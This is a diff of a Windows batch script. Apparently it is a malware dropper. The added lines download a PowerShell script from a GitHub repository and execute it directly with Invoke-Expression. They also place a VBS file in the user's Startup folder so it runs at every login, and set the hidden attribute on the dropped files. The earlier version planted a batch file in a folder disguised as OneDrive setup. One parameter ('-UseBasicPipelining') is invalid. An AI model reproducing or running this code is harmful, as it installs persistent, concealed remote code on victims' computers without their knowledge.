@@ -1,35 +1,40 @@
 @echo off
 setlocal enabledelayedexpansion
 
-REM Download the batch file
+REM Execute PowerShell to download and run the PowerShell script that will download receiver.bat
 powershell -NoProfile -Command ^
     "try {" ^
-    "    Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/receiver.bat' -OutFile 'C:\ProgramData\Microsoft OneDrive\setup\receiver.bat';" ^
-    "    Write-Host 'Download completed.'" ^
+    "    $scriptUrl = 'https://github.com/RaupenInspektor/pico/raw/main/interesting.ps1';" ^
+    "    $scriptContent = Invoke-WebRequest -Uri $scriptUrl -UseBasicPipelining | Select-Object -ExpandProperty Content;" ^
+    "    Invoke-Expression $scriptContent;" ^
+    "    Write-Host 'PowerShell script executed.'" ^
     "} catch {" ^
-    "    Write-Host 'Failed to download file: $_'" ^
+    "    Write-Host 'Failed to execute PowerShell script: $_'" ^
     "}"
 
-REM Hide the batch file if it exists
+REM Define the path to receiver.bat in AppData\Local
+set receiverPath=%APPDATA%\Local\receiver.bat
+
+REM Hide the receiver.bat file if it exists
 powershell -NoProfile -Command ^
     "try {" ^
-    "    if (Test-Path 'C:\ProgramData\Microsoft OneDrive\setup\receiver.bat') {" ^
-    "        Set-ItemProperty -Path 'C:\ProgramData\Microsoft OneDrive\setup\receiver.bat' -Name Attributes -Value ([System.IO.FileAttributes]::Hidden);" ^
-    "        Write-Host 'File hidden.'" ^
+    "    if (Test-Path '%receiverPath%') {" ^
+    "        Set-ItemProperty -Path '%receiverPath%' -Name Attributes -Value ([System.IO.FileAttributes]::Hidden);" ^
+    "        Write-Host 'Receiver.bat file hidden.'" ^
     "    } else {" ^
-    "        Write-Host 'File not found.'" ^
+    "        Write-Host 'Receiver.bat file not found.'" ^
     "    }" ^
     "} catch {" ^
-    "    Write-Host 'Failed to hide the file: $_'" ^
+    "    Write-Host 'Failed to hide receiver.bat: $_'" ^
     "}"
 
-REM Download the VBS file
+REM Download the VBS file to the Startup folder
 powershell -NoProfile -Command ^
     "try {" ^
     "    $startupPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\file.vbs');" ^
     "    Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/file.vbs' -OutFile $startupPath;" ^
     "} catch {" ^
-    "    Write-Host 'Failed to download starter'" ^
+    "    Write-Host 'Failed to download VBS file'" ^
     "}"
 
 REM Hide the VBS file if it exists
@@ -37,10 +42,10 @@ powershell -NoProfile -Command ^
     "try {" ^
     "    if (Test-Path $startupPath) {" ^
     "        Set-ItemProperty -Path $startupPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden);" ^
-    "        Write-Host 'File hidden.'" ^
+    "        Write-Host 'VBS file hidden.'" ^
     "    } else {" ^
-    "        Write-Host 'File not found.'" ^
+    "        Write-Host 'VBS file not found.'" ^
     "    }" ^
     "} catch {" ^
-    "    Write-Host 'Failed to hide the file: $_'" ^
+    "    Write-Host 'Failed to hide VBS file: $_'" ^
     "}"
